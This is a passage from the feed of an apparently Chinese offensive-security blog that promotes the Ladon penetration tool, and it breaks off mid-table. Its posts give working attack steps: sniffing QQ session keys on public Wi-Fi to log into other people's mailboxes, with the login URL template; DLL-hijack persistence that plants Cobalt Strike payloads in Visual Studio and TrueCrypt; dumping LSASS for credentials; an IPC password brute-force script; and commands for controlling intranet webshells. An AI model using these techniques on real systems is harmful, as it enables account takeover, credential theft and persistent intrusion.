    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无论是外网渗透还是内网渗透，为了能够长期控制权限，都会留下各类后门。<br>WebShell无额外进程、无额外端口、不主动向外连接的后门使用频率非常高。<br>外网的有很多管理工具不用说了，但是内网有WebShell机器无法上网怎么办？<br>方案1：代理后管理工具访问，缺点代理卡时，无法连接内网WebShell<br>方案2：使用Ladon，无需代理，只要有SHELL就可以连接内网WebShell</p><p>PS: Shell不只限于WebShell，而是任何可执行命令的，含远控、后门</p><h3 id="一键GetShell"><a href="#一键GetShell" class="headerlink" title="一键GetShell"></a>一键GetShell</h3><p>使用WebLogicExp模块对内网进行Weblogic漏洞扫描并GetShell<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/WeblogicExp64.PNG"></p><h3 id="Ladon-JspShell"><a href="#Ladon-JspShell" class="headerlink" title="Ladon JspShell"></a>Ladon JspShell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Usage：Ladon JspShell <span class="built_in">type</span> url <span class="built_in">pwd</span> cmd</span><br><span class="line">Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami</span><br></pre></td></tr></table></figure><p>K8-UA马,类型为1或ua（例子WebLogic）<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/JspShellExec.PNG"></p><p>菜刀马,类型为2或cd（例子Struts2）<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/JspShell_cd.PNG"></p><h3 id="CS-JspShell"><a href="#CS-JspShell" class="headerlink" title="CS JspShell"></a>CS JspShell</h3><p>Cobalt Strike下Ladon连接内网WebShell，用法和在CMD下一模一样</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/cs/CS_JspShell.PNG"></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>CS: <a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p><h3 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h3><p>暂时只支持JspShell，有空再添加其它SHELL</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;无论是外网渗透还是内网渗透，为了能够长期控制权限，都会留下各类后门。&lt;br&gt;WebShell无额外进程、无额外端口、不主动向外连接的后门使用
      
    
    </summary>
    
    
      <category term="Cobalt Strike" scheme="http://k8gege.org/categories/CS/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Cobalt Strike" scheme="http://k8gege.org/tags/CS/"/>
    
  </entry>
  
  <entry>
    <title>超过8年依然可用的QQkey免密登陆漏洞</title>
    <link href="http://k8gege.org/p/qqkey.html"/>
    <id>http://k8gege.org/p/qqkey.html</id>
    <published>2020-04-23T15:10:00.000Z</published>
    <updated>2020-05-18T14:19:30.692Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>你是否收到好友给你发的H站、赌博等站点的广告信息？没错都是QQKEY的蠕虫，在2012年的时候很疯狂<br>什么QQ空间自动发广告，邮箱自动给好友发广告消息等等，可能你点击里面的广告你的Q也跟着被盗…<br>如果你的号值钱就是以前常说的靓号，盗号者还会改你的信息卖你的QQ，当然现在也就只能发广告了<br>前几年可能也被电信诈骗利用，毕竟能通过资料或好友备注等很多信息，增加诈骗你好友钱的可信度</p><h3 id="什么是QQkey"><a href="#什么是QQkey" class="headerlink" title="什么是QQkey"></a>什么是QQkey</h3><p>不管是ClinetKey还是skey在这里我统称它为QQKEY吧，他俩是有区别的，但对于最终目的我们都是登陆。<br>比如说钥匙，长得不一样，售价不一样，开锁难度不一样，但它一样是锁，叫法或卖的价钱不一样而已。</p><p>无论是ClinetKey还是skey都是一张临时登陆的身分证，可理解为腾讯对特定字符串（cookie）的定义<br>ClientKey大家有没注意到当你登陆QQ后，访问QQ的相关站点，无需输入QQ密码即可自动登陆相关站点？<br>能自动登陆说明肯定有令牌，总不可能给你存密码，因此我们可以通过特定网页获取到QQKEY免密登陆。</p><p>发帖前我又测了一下2014年的QQKEY利用程序，确认依然存在,如QQ邮箱、QQ安全中心均可直接KEY登陆</p><p><img alt="image" data-original="http://k8gege.org/k8img/Other/qqkey.gif"></p><h3 id="获取内网QQkey"><a href="#获取内网QQkey" class="headerlink" title="获取内网QQkey"></a>获取内网QQkey</h3><p>由于腾讯对QQ做了异地登陆限制，需手机解锁等操作，相对来说也是顶安全的，但在公共场所就不一样了。<br>使用Ladon的HTTP嗅探功能，可轻松嗅探到局域网或公共场所中的QQ和SKEY，比如在网吧、学校、星巴克等<br>在公共场所获取到的QQ肯定是别人当前可登陆的，所以登陆地IP限制就不存在了，嗅到SKEY可直接登陆<br>Ladon获取SKEY的方法非常简单，命令Ladon HttpSniffer 192.168.1.8(本机IP)，坐等即可。<br>该功能在Ladon添加嗅探功能时就有,去年的12月份Ladon 6.0及以后版本均可以</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/QQskey.png"></p><h3 id="QQkey登陆邮箱"><a href="#QQkey登陆邮箱" class="headerlink" title="QQkey登陆邮箱"></a>QQkey登陆邮箱</h3><p><a href="http://ptlogin2.qq.com/jump?clientuin=QQ&amp;clientkey=key&amp;keyindex=9&amp;u1=https%3A%2F%2Fmail.qq.com%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26vm%3Dwpt%26ft%3Dloginpage%26target%3D&amp;pt_local_tk=&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=25" target="_blank" rel="noopener">http://ptlogin2.qq.com/jump?clientuin=QQ&amp;clientkey=key&amp;keyindex=9&amp;u1=https%3A%2F%2Fmail.qq.com%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26vm%3Dwpt%26ft%3Dloginpage%26target%3D&amp;pt_local_tk=&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=25</a></p><p>PS: 其它业务自行抓包获取URL，网上也公开很多ClientKeyt和Skey的利用工具，最新的是今年3月底</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_38837337/article/details/80673809" target="_blank" rel="noopener">https://blog.csdn.net/qq_38837337/article/details/80673809</a></p><h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>本文主要是告诉大家不要在使用公共WIFI登陆QQ，其实微信或其它应用也同理</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;你是否收到好友给你发的H站、赌博等站点的广告信息？没错都是QQKEY的蠕虫，在2012年的时候很疯狂&lt;br&gt;什么QQ空间自动发广告，邮箱自动
      
    
    </summary>
    
    
      <category term="密码" scheme="http://k8gege.org/categories/Pass/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
  </entry>
  
  <entry>
    <title>持久化后门之微软Visual Studio开发工具DLL劫持</title>
    <link href="http://k8gege.org/p/28288.html"/>
    <id>http://k8gege.org/p/28288.html</id>
    <published>2020-04-22T15:58:00.000Z</published>
    <updated>2020-04-23T10:22:10.810Z</updated>
    
    <content type="html"><![CDATA[<h3 id="DLL劫持-amp-白加黑"><a href="#DLL劫持-amp-白加黑" class="headerlink" title="DLL劫持&amp;白加黑"></a>DLL劫持&amp;白加黑</h3><p>DLL劫持在白加黑里最常见，07、08年开始在国内才开始起步，但主要是写病毒用到的较多，什么LPK.DLL、USP10.DLL都是当时流行的U盘病毒木马最喜欢用的劫持方式，因为它们可以劫持99%的EXE，10年后渗透圈才开始懂利用，常见的只是单纯用于提权而已。很多人在很多方面不懂举一反三，能执行添加用户命令，你就不懂让它执行远控上线了吗？一定要登3389?</p><p>目前还不能完全避免此漏洞，特别是应用软件们的，通过DLL劫持来绕过安全软件主动防御的保护被称为“白加黑”，因为加载的主程序是正常的软件，主动防御可能会放过它，允许它启动，而恶意DLL则通过该软件的漏洞或替换正常的同名文件（对应用软件的文件保护似乎并不象对系统文件保护那样严密，而且并不是一直运行状态，被替换还是比较容易的）， 甚至有的还会冒用合法软件的数字签字等方式，由正常程序加载，从而躲开安全软件的拦截。</p><p>当然可能有些人对白加黑有误解，以为非要劫持系统的才叫白加黑，实际APT里最常用的一些方法是，劫持第3方程序。比如360、讯雷、WinRar、Chrome、Office系列等存在DLL劫持，人家给你发送的马包含被劫持程序和对应DLL，运行正常的程序即可绕过主防上线。如海莲花等APT常用WINWORD.EXE加wwwlib.dll方式上线，因为EXE是WORD里的原版程序，有签名又合法它启动，杀软不拦，由于启动时会加载wwwlib.dll（什么C2或CS啊加密存在DLL里，海莲花常用的是CS），它就上线了，这也是白加黑利用。因为并不是所有人都安装WORD，而且安装的版本不定存在这个劫持，所以它必须捆绑EXE在里面，而这个合法的EXE可以是任何第3方程序。</p><h3 id="VS劫持"><a href="#VS劫持" class="headerlink" title="VS劫持"></a>VS劫持</h3><p>将K8测试专用DLL劫持工具里的DLL改名成SspiCli.dll后放入VS目录<br>运行VS即可，劫持对象VS2008-VS2015主程序devenv，VS2019已修复<br>其它不只主程序，只是时间太久了，我忘了懒得测，大家自行测试</p><h4 id="劫持VS2015"><a href="#劫持VS2015" class="headerlink" title="劫持VS2015"></a>劫持VS2015</h4><p><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs2015_ssp.jpg"></p><h4 id="劫持VS2012"><a href="#劫持VS2012" class="headerlink" title="劫持VS2012"></a>劫持VS2012</h4><p><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs2012_ssp.jpg"></p><h4 id="劫持VS2010"><a href="#劫持VS2010" class="headerlink" title="劫持VS2010"></a>劫持VS2010</h4><p><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs2010_ssp.jpg"></p><h4 id="劫持VS2008"><a href="#劫持VS2008" class="headerlink" title="劫持VS2008"></a>劫持VS2008</h4><p><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs2008_ssp.jpg"></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><a href="https://github.com/k8gege/K8tools/raw/master/K8dllhijack.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/K8dllhijack.rar</a></p><h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p>如CobalStrike生成DLL改名为SspiCli.dll，用户打开VS时即可上线</p><p>PS: 2016年在网易有发过，发现网上已搜不到，重新发一下<br><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs_all.jpg"><br>Notepad++ DLL劫持<br><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/notepad++.png"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>Notepad++ 修复被 CIA 利用的 DLL 劫持<br><a href="https://www.sohu.com/a/129080133_466846" target="_blank" rel="noopener">https://www.sohu.com/a/129080133_466846</a><br>[提权]Notepad++ DLL劫持漏洞<br><a href="https://bbs.mayidui.net/t219-e.html" target="_blank" rel="noopener">https://bbs.mayidui.net/t219-e.html</a></p><h3 id="扯个淡"><a href="#扯个淡" class="headerlink" title="扯个淡"></a>扯个淡</h3><p>几年前看过我网易博客甚至百度博客的时候会发现，我经过发提权或者DLL劫持的文章，那时候我不需要和别人说持久化人家就懂得如何利用用在哪方面，一张图片就够，而近几年你一定要和人家说一样的名词，不然TMD人家听不懂。不信大家看我19年用博客园时DLL劫持的文章并没多少人看，而以前大家对DLL劫持和提权的关注都是差不多的，这就是最明显的一点。当然也和很多人不会编程或写马有关系，你告诉人家哪个DLL能劫持的，他也没法利用，不关注也很正常。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;DLL劫持-amp-白加黑&quot;&gt;&lt;a href=&quot;#DLL劫持-amp-白加黑&quot; class=&quot;headerlink&quot; title=&quot;DLL劫持&amp;amp;白加黑&quot;&gt;&lt;/a&gt;DLL劫持&amp;amp;白加黑&lt;/h3&gt;&lt;p&gt;DLL劫持在白加黑里最常见，07、08年开始在国内才
      
    
    </summary>
    
    
      <category term="持久化" scheme="http://k8gege.org/categories/Persistence/"/>
    
      <category term="DLL劫持" scheme="http://k8gege.org/categories/DllHijack/"/>
    
    
      <category term="DllHijack" scheme="http://k8gege.org/tags/DllHijack/"/>
    
  </entry>
  
  <entry>
    <title>持久化后门之加密工具TrueCrypt DLL劫持</title>
    <link href="http://k8gege.org/p/26141.html"/>
    <id>http://k8gege.org/p/26141.html</id>
    <published>2020-04-22T15:55:00.000Z</published>
    <updated>2020-04-23T10:22:25.180Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>TrueCrypt，是一款免费开源的加密软件，同时支持Windows Vista,7/XP, Mac OS X, Linux 等操作系统。TrueCrypt不需要生成任何文件即可在硬盘上建立虚拟磁盘，用户可以按照盘符进行访问，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。TrueCrypt 提供多种加密算法，包括：AES-256, Blowfish (448-bit key), CAST5, Serpent, Triple DES, and Twofish，其他特性还有支持FAT32和NTFS分区、隐藏卷标、热键启动等。 </p><h3 id="软件荣誉"><a href="#软件荣誉" class="headerlink" title="软件荣誉"></a>软件荣誉</h3><p>FBI在经过一年的尝试后，还是未能破译被巴西执法机构指控金融犯罪的巴西银行家的加密文件。巴西一家葡萄牙语报纸报道（葡萄牙语），巴西联邦警察在2008年7月展开的Satyagraha行动中，在银行家Daniel Dantas位于里约热内卢的公寓内收缴了5个硬盘。文章提到硬盘使用了两种加密程序，一种是TrueCrypt，另一种是不知名的256位AES加密软件。在专家未能破解密码后，巴西政府在2009年初请求美国提供帮助，然而美国联邦警察在一年不成功的尝试后，退还了硬盘。巴西现有的法律中不存在强制要求Dantas交出密码的规定。</p><h3 id="TC劫持"><a href="#TC劫持" class="headerlink" title="TC劫持"></a>TC劫持</h3><p>将K8测试专用DLL劫持工具里的DLL改名成RichEd20.dll后放入TC目录<br>运行TrueCrypt目录下的3个EXE均会被劫持，成功弹出被劫持相关信息<br><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/TC_DllHijack.PNG"></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><a href="https://github.com/k8gege/K8tools/raw/master/K8dllhijack.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/K8dllhijack.rar</a></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>如CobalStrike生成DLL改名为RichEd20.dll，用户打开TC时即可上线</p><p>PS: 2016年在网易有发过，发现网上已搜不到，重新发一下，除了让别人知道，<br>也防止自己未来老年痴呆，被刚入门的利用TC持久化就蛋疼了，因为我喜欢用。<br>他搞你后还来一句，你看这SB这么简单的东西，他天天用都不知道我加了后门</p><p>Notepad++ DLL劫持<br><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/notepad++.png"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>Notepad++ 修复被 CIA 利用的 DLL 劫持<br><a href="https://www.sohu.com/a/129080133_466846" target="_blank" rel="noopener">https://www.sohu.com/a/129080133_466846</a><br>[提权]Notepad++ DLL劫持漏洞<br><a href="https://bbs.mayidui.net/t219-e.html" target="_blank" rel="noopener">https://bbs.mayidui.net/t219-e.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;TrueCrypt，是一款免费开源的加密软件，同时支持Windows Vista,7/XP, Mac OS X, Linux 等操作系统。T
      
    
    </summary>
    
    
      <category term="持久化" scheme="http://k8gege.org/categories/Persistence/"/>
    
      <category term="DLL劫持" scheme="http://k8gege.org/categories/DllHijack/"/>
    
    
      <category term="DllHijack" scheme="http://k8gege.org/tags/DllHijack/"/>
    
  </entry>
  
  <entry>
    <title>Ladon 6.4新增Linux系统探测、管理员提权System降权</title>
    <link href="http://k8gege.org/p/55476.html"/>
    <id>http://k8gege.org/p/55476.html</id>
    <published>2020-04-20T15:55:00.000Z</published>
    <updated>2020-05-03T11:47:26.426Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>你还在为权限切换的问题而烦恼吗？SYSTEM权限下浏览器密码读取工具失效？SYS权限下系统自带NET USE命令连接IPC失效？<br>SYSTEM权限下截取不到目标桌面？ADMIN权限下打不开SYSTEM权限进程？如何切换各种权限测试工具？等这些都是权限问题，在XP和03用户权限和SYS权限都是同一个会话，所以远控可直接记录到，很多功能我们也没发现影响，直到WIN7微软为了这全，将会话进行隔离，我们会发现SYS权限会话为0，用户为1，这就是为什么以前sys权限控制WIN7机器远程桌面会黑屏的原因?Firefxo和Chrome采用了DBAPI加密，该加密需要对应用户会话信息才能解密，直接以SYSTEM权限启动发现解密失败。所以我们需要切换权限</p><h3 id="Ladon-6-4更新功能"><a href="#Ladon-6-4更新功能" class="headerlink" title="Ladon 6.4更新功能"></a>Ladon 6.4更新功能</h3><p>5.2<br>[u] 修复noping参数问题(误注释了一行代码导致)<br>4.27<br>[+] Ping/PingIP 仅ICMP探测IP速度快(3-6秒/C段,5.8前的OnlinePC)<br>[+] CheckDoor 检测后门(网上公开多年的)–OCI.DLL/5个注册表RUN<br>[u] OsScan 修复6.2 4.20后osscan无法使用的BUG<br>[+] ipcscan.ini INI插件之Ipc密码爆破(net use)<br>[+] smbscan.ini INI插件之Smb密码爆破(impacket)<br>[+] smbhash.ini INI插件之NtlmHash爆破(impacket)</p><p>4.26<br>[+]JspShell 横向移动连接内网webshell执行命令</p><p>4.20<br>[+] GetSystem 管理员/SYSTEM权限切换<br>[+] DumpLsass 导出Lsass内存文件<br>[u] OsScan新增SSH识别操作系统<br>[u] WebScan、SameWeb新增WebBanner<br>[+] WhatCms新增Banner、TP-Link WDR7300识别<br>[u] 修复6.3漏扫10、20等含0的C段</p><h3 id="提权-以SYSTEM权限执行"><a href="#提权-以SYSTEM权限执行" class="headerlink" title="提权 以SYSTEM权限执行"></a>提权 以SYSTEM权限执行</h3><p>命令：Ladon GetSystem cmd.exe<br>命令：Ladon GetSystem cmd.exe /system<br>命令：Ladon GetSystem cmd.exe lsass<br>可指定EXE或BAT，将以SYSTEM权限运行，如下图弹个CMD<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/GetSystem.PNG"></p><p>注意：需管理员权限，若存在UAC可使用BypassUac获取管理员</p><p>当然也可以使用系统AT、SCHTASKS等命令获取SYSTEM权限，不担心被杀，只是麻烦点，看Ladom多简单</p><h3 id="降权-以用户权限执行"><a href="#降权-以用户权限执行" class="headerlink" title="降权 以用户权限执行"></a>降权 以用户权限执行</h3><p>SYSTEM权限下并不是什么都可以做，比如大家用Ladon或其它工具弹出个SYS权限CMD，再试一下系统自带的NET USE命令连接IPC看提示什么，你会发现明明密码是正确的但是却提示错误。为何需提权、降权我在14年已发布<br>命令：Ladon GetSystem cmd.exe /user<br>命令：Ladon GetSystem cmd.exe explorer<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/GetSystem2.PNG"></p><p>PS: 当然也可以切换至任意权限，指定对应进程即可，如降权到服务权限等</p><h3 id="DumpLsass内存密码"><a href="#DumpLsass内存密码" class="headerlink" title="DumpLsass内存密码"></a>DumpLsass内存密码</h3><p>Dump Lsass内存文件，取回本地读取密码，无需免杀MIMI<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/DumpLsass.PNG"></p><h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p>命令: Ping 或 PingIP</p><p>仅ICMP协议探测存活主机（速度快3-6秒/ C段，5.8版本前的OnlinePC）<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/PingIP.PNG"></p><h3 id="Ipc密码爆破"><a href="#Ipc密码爆破" class="headerlink" title="Ipc密码爆破"></a>Ipc密码爆破</h3><p>INI插件：调用系统net use命令进行IPC爆破，由于系统限制只能连接一个，因此只能验证一个密码结束后，才能对下一个密码进行验证，而且必须删除连接，以上因素导致用系统命令爆破速度会很慢，因为你无法多线程一下就验证多个密码，所以Ladon内置模块不再保留IpcScan，使用分破4万密码的SmbScan可快速验证密码或者调用impacket的smbexec验证速度要比net use也快很多。</p><p>PS：此模块的存在主要是用于针对2003或XP系统的Ipc爆破，远程为Win7后系统推荐使用内置SmbScan爆破</p><p>ipcscan.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line"><span class="comment">#Brute-Force IPC(445) PassWord </span></span><br><span class="line">exe=cmd.exe</span><br><span class="line">arg=net use \\<span class="variable">$ip</span>$ /user:<span class="variable">$user</span>$ <span class="variable">$pass</span>$ &amp; net use \\<span class="variable">$ip</span>$ /del</span><br><span class="line"><span class="comment">#isok=The command completed successfully</span></span><br><span class="line">isok=命令成功完成</span><br><span class="line">port=445</span><br><span class="line"><span class="built_in">log</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>扫描C段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/c ipcscan.ini</span><br></pre></td></tr></table></figure><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/INI_ipcscan.PNG"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;你还在为权限切换的问题而烦恼吗？SYSTEM权限下浏览器密码读取工具失效？SYS权限下系统自带NET USE命令连接IPC失效？&lt;br&gt;SY
      
    
    </summary>
    
    
      <category term="提权" scheme="http://k8gege.org/categories/Lpe/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
  </entry>
  
  <entry>
    <title>Ladon中28种探测存活主机方法(含绕过防火墙探测)</title>
    <link href="http://k8gege.org/p/48225.html"/>
    <id>http://k8gege.org/p/48225.html</id>
    <published>2020-04-02T15:00:00.000Z</published>
    <updated>2020-04-06T10:36:28.648Z</updated>
    
    <content type="html"><![CDATA[<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/OnlinePC6.2.png"></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>内网渗透中，最重要的一步就是探测在线机器，只有先探测到机器<br>接下来才是探测操作系统、扫描端口服务、开放WEB、扫描漏洞等。<br>目标不开机，你搞啥呢？当然也有一种情况，目标开机但却扫不到<br>这是因为目前大部份扫描器使用PING扫描，而防火墙默认是拦截的<br>默认条件下也不放行其它端口，比如SMB、RDP、HTTP等协议也不行<br>那能不能在防火墙完全防护状态下探测存活机器呢？答案是有的。</p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>Win7-A: 192.168.1.20 测试防火墙<br>Win7-B: 192.168.1.7  Ladon扫描器</p><p>实验1：A机器关闭防火墙<br>实验2：A机器开启防火墙<br>实验3：A机器关机</p><p>PS：整个过程中B机器防火墙需关闭，因为要保证所有协议都能进出B机器<br>才能测试防火墙开启或关闭的情况下，分别有哪些协议可以探测存活主机</p><h3 id="A关闭防火墙"><a href="#A关闭防火墙" class="headerlink" title="A关闭防火墙"></a>A关闭防火墙</h3><p>ICMP协议可达目标机器，即可PING通A机器<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.20      00-0C-00-00-00-50                       VMware<br>=============================================<br>OnlinePC:5</p><h3 id="A开启防火墙"><a href="#A开启防火墙" class="headerlink" title="A开启防火墙"></a>A开启防火墙</h3><p>ICMP协议不可达目标机器，即无法PING通A机器，但是MAC可以<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br> MAC: 192.168.1.20      00-0C-00-00-00-50                       VMware<br>ICMP: 192.168.1.2       38-AD-00-00-00-1F                       NewH3C<br>=============================================<br>OnlinePC:6</p><h3 id="A机器关机"><a href="#A机器关机" class="headerlink" title="A机器关机"></a>A机器关机</h3><p>A机器关机后，发现无法探测MAC，说明能获取到MAC，机器肯定在线<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.2       38-AD-00-00-00-1F                       NewH3C<br>=============================================<br>OnlinePC:5</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>开机状态下，开启系统防火墙后，无法PING通机器（默认配置）<br>但可获取远程机器MAC，因此可通过MAC探测目标主机是否存活</p><h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>1.有人问我Ladon扫描出来的存活机器，为何PING不通呢?是不是不准？<br>答：首先机器存活，但相关端口未开放，如3389没开,你当然连不上。<br>同理防火墙默认根本不允许ICMP协议通过，你PING不通很正常。Ladon<br>通过其它方式探测到存活，而非单纯的ICMP，PING不通并不代表关机<br>上面的实验结果已充分说明，用其它工具扫描可能会漏掉禁PING机器</p><p>2.有人问我为什么新版的OnlinePC比之前慢了，以前3秒可扫一个C段。<br>再重复一次，Ladon的OnlinePC不只是单纯的通过ICMP检测存活主机。<br>打个比方一个人自己开车去北京，中途车坏了他就不去了，事情结束<br>如果车坏了，找人来修或换乘轮船，最后到达北京时间是不是多了。<br>新版的先PING机器,不通并没有结束，而是再尝试使用其它协议探测<br>最简单的一个问题，你是想要扫描结果更准更多，还是结果少速度快<br>再者以前可能3秒至几秒，现在可能几秒至13秒，才多几秒钟也不慢啊</p><p>以上两个问题是我发此文章的主要原因，怕还会有很多人问同样的问题</p><h3 id="28种方法"><a href="#28种方法" class="headerlink" title="28种方法"></a>28种方法</h3><p>Ladon以下模块均可用于探测存活主机，不要死板的只用OnlinePC<br>或者只用其它只是用PING来扫描的工具，得到的结果错过很多机器<br>可根据实际情况使用以下模块探测存活主机，如WAF禁用HTTP协议<br>采用HTTP协议的模块就不要用了，即便同样是HTTP，模块结果不同<br>如WhatCMS识别到CMS才回显，WebScan还会返回HttpBanner。<br>所以同个协议，有些模块扫不出东西，不代表防火墙禁止该协议。</p><p>如大家最容易理解的扫445端口发现不开放，不代表TCP协议禁用<br>因为人家怕你用MS17010漏洞一键GETSHELL，所以禁止了共享而已<br>如果要精准探测存活主机，就得使用多个方式才能深入拓展内网</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>采用协议</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>OnlinePC</td><td>存活主机信息</td><td>ICMP、MAC、DNS</td><td>Ladon 192.168.1.1/24 OnlinePC</td></tr><tr><td>2</td><td>OnlineIP</td><td>存活主机(IP)</td><td>ICMP、MAC、DNS</td><td>Ladon 192.168.1.1/24 OnlineIP</td></tr><tr><td>3</td><td>UrlScan</td><td>URL域名扫描</td><td>HTTP</td><td>Ladon 192.168.1.1/24 UrlScan</td></tr><tr><td>4</td><td>SameWeb</td><td>同服域名扫描</td><td>HTTP</td><td>Ladon 192.168.1.1/24 SameWeb</td></tr><tr><td>5</td><td>WebScan</td><td>Web信息扫找</td><td>HTTP</td><td>Ladon 192.168.1.1/24 WebScan</td></tr><tr><td>6</td><td>HostIP</td><td>主机名解析</td><td>DNS</td><td>Ladon Win-K8gege HostIP</td></tr><tr><td>7</td><td>DomainIP</td><td>域名解析</td><td>DNS</td><td>Ladon k8gege.org DomainIP</td></tr><tr><td>8</td><td>OsScan</td><td>操作系统版本</td><td>MAC、DNS、SMB、HTTP、RDP、TCP等</td><td>Ladon 192.168.1.1/24 OsScan</td></tr><tr><td>9</td><td>PortScan</td><td>扫描Banner</td><td>TCP</td><td>Ladon 192.168.1.1/24 PortScan</td></tr><tr><td>10</td><td>WhatCMS</td><td>Web指纹识别</td><td>HTTP</td><td>Ladon 192.168.1.1/24 